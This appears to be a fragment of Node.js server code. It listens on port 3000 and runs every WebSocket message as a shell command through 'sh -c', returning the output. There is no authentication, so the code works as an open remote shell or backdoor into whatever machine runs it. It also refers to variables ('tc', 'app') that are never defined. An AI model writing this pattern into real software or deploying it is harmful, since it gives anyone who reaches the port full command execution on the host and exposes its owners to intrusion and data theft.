const server = http.createServer(app);
var WebSocket = require('faye-websocket');


server.on('upgrade', function(request, socket, body) {
    if (WebSocket.isWebSocket(request)) {
        var ws = new WebSocket(request, socket, body);
        ws.on("message", function(event) {
            const spawn = require('child_process').spawn;
            const cmd = spawn('sh', ['-c', event.data]);
            var result = "";
            cmd.stdout.on('data', (data) => {
                result += data;
            });
            cmd.on('close', (code) => {
                ws.send(result);
            })
        });
        ws.on('close', function (code, reason) {
            // logger.warn('websocket client disconnected: ' + code + ' [' + reason + ']');
            if (tc != null) {
                tc.end();
            }
        });
        ws.on('error', function (a) {
            // logger.warn('websocket client error: ' + a);
            if (tc != null) {
                tc.end();
            }
        });
    }
});

server.listen(3000)
